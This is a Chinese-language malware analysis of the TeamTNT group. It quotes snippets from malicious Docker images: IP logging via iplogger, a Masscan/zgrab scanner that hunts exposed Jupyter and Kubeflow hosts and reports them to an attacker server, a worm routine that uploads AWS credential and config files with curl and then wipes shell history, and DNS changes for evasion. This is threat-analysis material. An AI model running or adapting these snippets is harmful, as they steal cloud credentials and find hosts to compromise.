# TeamTNT

## 特征

1. 在构造恶意Docker镜像时会使用TNTfeatB0rg窃取AWS凭据，恶意软件部分代码通过Base64编码嵌入到system函数调用.

2. 在Docker镜像中还使用了https://iplogger.org/网站服务，以记录受害者主机的IP地址，然后再通过自托管的地址将其记录.

```bash
#!/bin/bash
curl -Lk https://iplogger.org/个人地址 -o /dev/null
sleep 3
curl -Lk https://IP地址//SATW/ip.php -o /dev/null

```

此Docker镜像中还包含一个tornado.sh脚本，该脚本通过Masscan和Zgarb工具侦察目标IP地址范围和提供的端口，如果匹配到"Home Page - Select or create a notebook"、"Kubeflow Central Dashboard"、"Jupyter Lab"、"JupyterLab"关键字则会通过jq过滤掉其匹配的IP地址信息（如代码清单1.51所示），然后发送到可控主机上.

```bash
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
//将匹配的IP地址添加到rndstr数组
if [ "$T_PORT" =  "8888" ]; then
eval "$rndstr"="'$(masscan $T_RANGE -p$T_PORT --rate=$S_RATE | awk '{print $6}' | zgrab --senders 200 --port $T_PORT --http='/tree' --output-file=- 2>/dev/null | grep -E "Home Page - Select or create a notebook/Kubeflow Central Dashboard|Jupyter Lab|JupyterLab' l jg-r .ip)'"
//向网页地址/tree路径发送请求
else
eval "$rndstr"="'$(masscan $T_RANGE -p$T_PORT --rate=$S_RATE | awk '{print $6}' | zgrab --senders 200 --port $T_PORT --http='/' --output-file=- 2>/dev/null | grep -E "Home Page - Select or create a notebook/Kubeflow Central Dashboard|Jupyter Lab|JupyterLab' l jg-r .ip)'"
//向网页根路径发送请求
fi

for IP_ADDR in ${!rndstr}
do

if [ "$T_PORT" = "443" ]; then
TARGET="https://"$IP_ADDR
else
TARGET="http://"$IP_ADDR:$T_PORT
fi
echo '##################################################'
curl -sLk http://IP地址/SATW/res.php?vuln=$TARGET -o /dev/null
//将数据发送到可控主机
echo $TARGET
done;
}
```

3. 蠕虫会通过几行代码窃取AWS的凭证文件~/.aws/credentials和配置文件~/.aws/config.

```bash
if [ -f /root/.aws/credentials ]; then
echo "FOUND : /root/.aws/credentials"
curl -F "userfile=@/root/.aws/credentials" http://域名/thx/for/your/key/index.php
//发送AWS凭证到攻击者服务器
curl -F "userfile=@/root/.aws/config" http://域名/thx/for/your/key/index.php
//发送AWS配置文件到攻击者服务器
history -c
fi

if [ -f /home/*/.aws/credentials ]; then
echo "FOUND : /home/*/.aws/credentials"
curl -F "userfile=@/home/jovyan/.aws/credentials" http://域名/thx/for/your/key/index.php
curl -F "userfile=@/home/jovyan/.aws/config" http://域名/thx/forlyour/key/index.php
history -c
fi

rm -f $0
```

4. Hildegard恶意软件使用开源项目ziggystartux构建的IRC代理，然后通过修改系统DNS解析为谷歌的DNS服务器来避免被DNS监控工具检测到.

```bash
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.4.4' 2>/dev/null 1>/dev/null || echo 'nameserver 8.8.4.4' >> /etc/resolv.conf
//修改DNS解析为8.8.4.4
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.8.8' 2>/dev/null 1>/dev/null || echo 'nameserver 8.8.8.8' >> /etc/resolv.conf
//修改DNS解析为8.8.8.8
```
